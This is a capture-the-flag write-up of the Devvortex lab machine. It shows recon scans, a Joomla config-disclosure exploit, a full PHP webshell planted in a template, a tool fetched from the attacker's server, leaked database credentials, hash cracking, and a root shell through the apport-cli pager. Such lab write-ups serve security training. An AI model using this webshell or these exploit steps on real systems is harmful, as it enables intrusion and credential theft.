## Description
Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service's configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell. 
## Information gathering
I started with a full TCP scan:
```
$sudo nmap -p- 10.129.229.146 -O -oN scans/nmap_full -v 
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-14 10:57 CET
Initiating Ping Scan at 10:57
Scanning 10.129.229.146 [4 ports]
Completed Ping Scan at 10:57, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:57
Completed Parallel DNS resolution of 1 host. at 10:57, 0.01s elapsed
Initiating SYN Stealth Scan at 10:57
Scanning 10.129.229.146 [65535 ports]
Discovered open port 22/tcp on 10.129.229.146
Discovered open port 80/tcp on 10.129.229.146
Completed SYN Stealth Scan at 10:57, 14.48s elapsed (65535 total ports)
Initiating OS detection (try #1) against 10.129.229.146
Nmap scan report for 10.129.229.146
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Uptime guess: 17.670 days (since Wed Dec 27 18:52:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds
           Raw packets sent: 65774 (2.895MB) | Rcvd: 65549 (2.623MB)
```
We have two open ports (22 and 80) running on a Linux 5.X system. Let's get more information about these:
```
$sudo nmap -p22,80 10.129.229.146 -sC -sV -oN scans/nmap_service -v 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-14 11:06 CET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating Ping Scan at 11:06
Scanning 10.129.229.146 [4 ports]
Completed Ping Scan at 11:06, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:06
Completed Parallel DNS resolution of 1 host. at 11:06, 0.01s elapsed
Initiating SYN Stealth Scan at 11:06
Scanning 10.129.229.146 [2 ports]
Discovered open port 80/tcp on 10.129.229.146
Discovered open port 22/tcp on 10.129.229.146
Completed SYN Stealth Scan at 11:06, 0.05s elapsed (2 total ports)
Initiating Service scan at 11:06
Scanning 2 services on 10.129.229.146
Completed Service scan at 11:07, 6.05s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.229.146.
Initiating NSE at 11:07
Completed NSE at 11:07, 0.72s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.08s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Nmap scan report for 10.129.229.146
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Initiating NSE at 11:07
Completed NSE at 11:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```
An OpenSSH 8.2p1 server is running on port 22. An HTTP server with nginx 1.18.0 is running on port 80. It redirects to http://devvortex.htb/. Let's add it to our hosts file:
```
#echo "10.129.229.146 devvortex.htb" >> /etc/hosts
```
At a first look, it seems to be a simple portfolio website. Let's look at hidden pages:
```
$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://devvortex.htb/FUZZ -ic -v 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 27ms]
| URL | http://devvortex.htb/images
| --> | http://devvortex.htb/images/
    * FUZZ: images

[Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 27ms]
| URL | http://devvortex.htb/
    * FUZZ: 

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 22ms]
| URL | http://devvortex.htb/css
| --> | http://devvortex.htb/css/
    * FUZZ: css

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 19ms]
| URL | http://devvortex.htb/js
| --> | http://devvortex.htb/js/
    * FUZZ: js

[Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 20ms]
| URL | http://devvortex.htb/
    * FUZZ: 

:: Progress: [220547/220547] :: Job [1/1] :: 1715 req/sec :: Duration: [0:02:04] :: Errors: 0 ::
```
Ffuf did not find any interesting hidden directories. All of the found directories return a 301 status code preventing us to look at their content.

Let's look for a vhost:
```
$ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

www                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 23ms]
www2                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 23ms]
ns4                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 23ms]
[...]
```
Let's filter size 154 (I prefer to not filter the status 302 which may indicate a correct vhost):
```
$ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 66ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1939 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
```
There is one vhost that we can add in the hosts file:
```
#echo "10.129.229.146 dev.devvortex.htb" >> /etc/hosts
```
dev.devvortex.htb seems to be the development server for the website. There is one link in the entire page to http://dev.devvortex.htb/portfolio-details.html. It brings to a page with the following error message:
```
The requested page can't be found.

An error has occurred while processing your request.

You may not be able to visit this page because of:

    an out-of-date bookmark/favourite
    a mistyped address
    a search engine that has an out-of-date listing for this site
    you have no access to this page

Go to the Home Page
```
It is a Joomla error. It is also interesting to note that the link that redirects to the homepage is `index.php`.

Let's look for any hidden directories:
```
$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.devvortex.htb/FUZZ -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 3463ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 3587ms]
[...]
```
You can see the server is really slow and it would take forever to enumerate all the directories. Hopefully, we know this is a Joomla server and we can try to deduce the administrator interface: http://dev.devvortex.htb/administrator/.
We can also see the version of Joomla at http://dev.devvortex.htb/administrator/manifests/files/joomla.xml. It is version 4.2.6. This version seems to be vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752).
## Vulnerability assessment
To check if the server is vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752), we need to access to `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`. We can see that a username and a password is leaking. Using them on the administrator interface leads to a login. These credentials do not work to log in SSH.
## Exploitation
From the admin interface, it is possible to edit template files: System > Site Templates > Cassiopeia Details and Files. You cannot modify the file `index.php` but you can modify `error.php`. I replaced the content of the file with the following PHP webshell:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
I can get the webshell after reaching the address `http://dev.devvortex.htb/templates/cassiopeia/error.php`. The page `error.php` seems to be updated regularly, so I need to be fast.
This webshell is quite limited so I changed the payload to `PHP PentestMonkey`, also available on `revshells.com`.

We can see that there is a user named `logan` but we have not the permissions to read the file `/home/logan/user.txt`:
```
$ ls -l /home
total 4
drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 logan
$ ls -l /home/logan
total 4
-rw-r----- 1 root logan 33 Jan 20 07:06 user.txt
```

I will use linpeas to check if I can login as logan. On my machine, I set up an HTTP server to download linpeas:
```
$ls
linpeas.sh
$python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
And, from the attacked machine:
```
$ wget http://10.10.14.59:8080/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```
The `linpeas.sh` script seems to hang at `Checking for TTY (sudo/su) passwords in audit logs`. I will update the script to remove this part and run the script again.

The script shows that a password appears in a PHP configuration file. This file is `configuration.php`. It contains the following information:
```
<?php
class JConfig {
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'lewis';
	public $password = 'P4ntherg0t1n5r3c0n##';
	public $db = 'joomla';
	public $secret = 'ZI7zLTbaGKliS9gq';
}
```
This gives us the credentials to log into the MySQL server:
```
www-data@devvortex:/$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 56
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

By looking into the database, we can get the password hash of the user logan:
```
mysql> select name, password from sd4fg_users;
select name, password from sd4fg_users;
+------------+--------------------------------------------------------------+
| name       | password                                                     |
+------------+--------------------------------------------------------------+
| lewis      | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan paul | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+------------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

I ran hashcat to check if this hash can be cracked:
```
$ echo "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" > john.txt
$hashcat -m 3200 john.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
No results.

I tried with the RockYou wordlist:
```
$hashcat -m 3200 john.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 13706/13770 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:t[...SNIP...]o
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sun Jan 21 12:38:59 2024 (21 secs)
Time.Estimated...: Sun Jan 21 12:39:20 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       66 H/s (7.47ms) @ Accel:8 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1376/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidates.#1....: jesse -> tagged
```

I can now log as logan and get the flag:
```
$ su logan
Password: t[...SNIP...]o

logan@devvortex:/$ cat /home/logan/user.txt
4[...SNIP...]5
```
## Privilege escalation
Now that I have access to logan account, I run a linpeas analysis to find a way to escalate privileges. In the log, I got:
```
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
```
So I did it:
```
logan@devvortex:/tmp$ sudo -l
sudo -l
[sudo] password for logan: 

Sorry, try again.
[sudo] password for logan: tequieromucho

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
It seems that I can run `apport-cli` with the sudo command. Looking at any vulnerability for this binary, I found [`CVE-2023-1326`](https://github.com/diego-tella/CVE-2023-1326-PoC) which allows a user to execute system command when reading a crash dump. I looked for a crash dump on the system:
```
logan@devvortex:/tmp$ find / -name \*.crash 2> /dev/null
/var/crash/_usr_bin_apport-unpack.1000.crash
```
Then, I just have to run `apport-cli` with this crash dump:
```
logan@devvortex:/tmp$ sudo apport-cli -c /var/crash/_usr_bin_apport-unpack.1000.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (29.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
[...]
ERROR: Cannot update /var/crash/_usr_bin_apport-unpack.1000.crash: [Errno 13] Permission denied: '/var/crash/_usr_bin_apport-unpack.1000.crash'
....
WARNING: terminal is not fully functional
-  (press RETURN)!whoami
!wwhhooaammii!whoami
root
!done  (press RETURN)!cat /root/root.txt

!ccaatt  //rroooott//rroooott..ttxxtt!cat /root/root.txt
a[...]b
```
Bingo!
## Lessons learned
I lost a lot of time working on this machine due to bad copy-paste of commands, or by searching for important commands in my previous write-ups. I think I should create scripts to automate some parts of the enumeration (nmap, ffuf...) and keep notes of important commands to reuse them later. Also, I lost a lot of time by using the wrong wordlist to get the password of the user `logan`. It could be interesting to take note of the more complete wordlists in the future.